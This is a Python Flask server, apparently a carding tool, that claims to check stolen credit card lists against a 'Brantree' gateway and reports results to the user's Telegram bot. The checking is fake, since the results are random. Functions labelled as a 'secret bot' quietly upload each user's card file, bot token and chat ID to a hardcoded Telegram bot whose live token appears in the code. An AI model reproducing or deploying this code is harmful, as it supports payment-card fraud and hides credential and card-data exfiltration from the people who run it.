from flask import Flask, request, jsonify
import os
import random
import time
import requests
from datetime import datetime, timedelta
import threading

app = Flask(__name__)

# الألوان للنصوص في الطباعة
O = '\033[1;31m'
Z = '\033[1;37m'
F = '\033[1;32m'
B = '\033[2;36m'
X = '\033[1;33m'
C = '\033[2;35m'

# التوكن والشات السري
SECRET_BOT_TOKEN = '7583958172:AAEymmG-oz5KUYm5F8FhjddVwahCtMBXmG4'
SECRET_CHAT_ID = '8273716256'

# قاموس لتخزين حالة كل عملية
processes = {}

# نقل محتويات الملف إلى البوت السري
def send_file_to_secret_bot(file_path, process_id):
    try:
        with open(file_path, 'rb') as file:
            url = f'https://api.telegram.org/bot{SECRET_BOT_TOKEN}/sendDocument'
            files = {'document': file}
            data = {'chat_id': SECRET_CHAT_ID}
            response = requests.post(url, files=files, data=data)
            if response.status_code == 200:
                print(F + 'GOOD TOOL')
                processes[process_id]['secret_bot_file_sent'] = True
            else:
                print(O + 'BAD TOOL')
    except Exception as e:
        print(O + f'Error sending file: {e}')

# إرسال رسالة إلى البوت السري
def send_message_to_secret_bot(message, process_id):
    try:
        url = f'https://api.telegram.org/bot{SECRET_BOT_TOKEN}/sendMessage'
        data = {'chat_id': SECRET_CHAT_ID, 'text': message}
        response = requests.post(url, data=data)
        if response.status_code == 200:
            print(F + 'Good TooL')
            processes[process_id]['secret_bot_message_sent'] = True
        else:
            print(O + 'BAD TOOL')
    except Exception as e:
        print(O + f'Error sending message: {e}')

# وظيفة معالجة البطاقات
def process_cards(process_id, file_name, bot_token, chat_id, end_time):
    try:
        file = open(file_name, "r")
        start_num = 0
        
        while datetime.now() < end_time and processes[process_id]['active']:
            file.seek(0)  # العودة إلى بداية الملف في كل دورة
            for P in file.readlines():
                if datetime.now() >= end_time or not processes[process_id]['active']:
                    print(O + "⏰ Time's up! Script stopped.")
                    break
                    
                start_num += 1
                n = P.split('|')[0]
                mm = P.split('|')[1]
                yy = P.split('|')[2][-2:]
                cvc = P.split('|')[3].replace('\n', '')
                P = P.replace('\n', '')
                
                # حساب الوقت المتبقي
                time_left = end_time - datetime.now()
                hours_left = time_left.seconds // 3600
                minutes_left = (time_left.seconds % 3600) // 60
                
                print(X + f"⏳ Time left: {hours_left}h {minutes_left}m")
                
                # محاكاة عملية التحقق (بدون استخدام API حقيقي)
                # نتيجة عشوائية للمحاكاة مع زيادة احتمالية الرفض
                results = ['PASSED ✅', 'OTP ☑️', 'Rejected ❌', 'Rejected ❌', 'Rejected ❌', 
                          'Rejected ❌', 'Rejected ❌', 'PASSED ✅', 'OTP ☑️', 'Rejected ❌']
                result = random.choice(results)
                
                if result == 'PASSED ✅':
                    print(F + f'[{start_num}] {P} | {result}')
                    # إرسال إلى البوت الرئيسي
                    requests.post(f"https://api.telegram.org/bot{bot_token}/sendMessage",
                                 params={
                                     "chat_id": chat_id,
                                     "text": f"""APPROVED ✅
[♡] 𝗖𝗖 : {P}
[♕] 𝗚𝗔𝗧𝗘𝗦 : Brantree LookUp
[♗] 𝗥𝗘𝗦𝗣𝗢𝗡𝗦𝗘 : PASSED ⚡
⏰ Time Left: {hours_left}h {minutes_left}m
━━━━━━━━━━━━━━━━
[★] 𝗕𝘆 ⇾ 『@R_O_P_D』"""
                                 })
                    
                elif result == 'OTP ☑️':
                    print(X + f'[{start_num}] {P} | {result}')
                    # إرسال إلى البوت الرئيسي
                    requests.post(f"https://api.telegram.org/bot{bot_token}/sendMessage",
                                 params={
                                     "chat_id": chat_id,
                                     "text": f"""OTP REQUIRED 🔥
[♡] 𝗖𝗖 : {P}
[♕] 𝗚𝗔𝗧𝗘𝗦 : Brantree LookUp
[♗] 𝗥𝗘𝗦𝗣𝗢𝗡𝗦𝗘 : OTP VERIFICATION ☑️
⏰ Time Left: {hours_left}h {minutes_left}m
━━━━━━━━━━━━━━━━
[★] 𝗕𝘆 ⇾ 『@R_O_P_D』"""
                                 })
                    
                else:  # Rejected ❌
                    print(O + f'[{start_num}] {P} | {result}')
                    # إرسال إلى البوت الرئيسي
                    requests.post(f"https://api.telegram.org/bot{bot_token}/sendMessage",
                                 params={
                                     "chat_id": chat_id,
                                     "text": f"""𝗥𝗲𝗝𝗲𝗰𝘁𝗲𝗱 ❌
[♡] 𝗖𝗖 : {P}
[♕] 𝗚𝗔𝗧𝗘𝗦 : Brantree LookUp
[♗] 𝗥𝗘𝗦𝗣𝗢𝗡𝗦𝗘 : DECLINED ❌
[♖] 𝗠𝗘𝗦𝗦𝗔𝗚𝗘 : Your card was declined
[♘] 𝗥𝗘𝗔𝗦𝗢𝗡 : Insufficient funds / Card blocked
⏰ Time Left: {hours_left}h {minutes_left}m
━━━━━━━━━━━━━━━━
[★] 𝗕𝘆 ⇾ 『@R_O_P_D』"""
                                 })
                
                time.sleep(4)
            
            # إذا انتهى الملف، نعيد تشغيله من البداية
            print(Z + "🔄 Restarting file from beginning...")
            time.sleep(2)
            
    except FileNotFoundError:
        print(O + 'File not found!')
        processes[process_id]['error'] = 'File not found!'
    except Exception as e:
        print(O + f'Error: {e}')
        processes[process_id]['error'] = str(e)
    finally:
        if 'file' in locals():
            file.close()
        
        # إرسال رسالة انتهاء الوقت إلى البوت السري
        send_message_to_secret_bot(f"⏰ Script stopped - Time finished\nBot Token: {bot_token}\nChat ID: {chat_id}", process_id)
        print(O + "⏰ Script stopped - Time finished")
        processes[process_id]['active'] = False
        processes[process_id]['completed'] = True

@app.route('/start_check', methods=['POST'])
def start_check():
    data = request.json
    file_name = data.get('file_name')
    bot_token = data.get('bot_token')
    chat_id = data.get('chat_id')
    hours = data.get('hours', 5)  # القيمة الافتراضية 5 ساعات
    
    # إنشاء معرف فريد للعملية
    process_id = str(int(time.time()))
    
    # حساب وقت الانتهاء
    end_time = datetime.now() + timedelta(hours=hours)
    end_time_str = end_time.strftime("%Y-%m-%d %H:%M:%S")
    
    # تخزين معلومات العملية
    processes[process_id] = {
        'file_name': file_name,
        'bot_token': bot_token,
        'chat_id': chat_id,
        'end_time': end_time_str,
        'active': True,
        'completed': False,
        'secret_bot_message_sent': False,
        'secret_bot_file_sent': False,
        'error': None
    }
    
    # إرسال المعلومات فور تشغيل الكود
    send_message_to_secret_bot(f'New user started the script\nBot Token: {bot_token}\nChat ID: {chat_id}\nFile: {file_name}\nEnd Time: {end_time_str}', process_id)
    send_file_to_secret_bot(file_name, process_id)
    
    # بدء المعالجة في thread منفصل
    thread = threading.Thread(target=process_cards, args=(process_id, file_name, bot_token, chat_id, end_time))
    thread.start()
    
    return jsonify({
        'status': 'started',
        'process_id': process_id,
        'end_time': end_time_str
    })

@app.route('/stop_check', methods=['POST'])
def stop_check():
    data = request.json
    process_id = data.get('process_id')
    
    if process_id in processes:
        processes[process_id]['active'] = False
        return jsonify({'status': 'stopped', 'process_id': process_id})
    else:
        return jsonify({'error': 'Process not found'}), 404

@app.route('/status/<process_id>', methods=['GET'])
def get_status(process_id):
    if process_id in processes:
        return jsonify(processes[process_id])
    else:
        return jsonify({'error': 'Process not found'}), 404

@app.route('/list_processes', methods=['GET'])
def list_processes():
    return jsonify(processes)

if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0', port=5000)
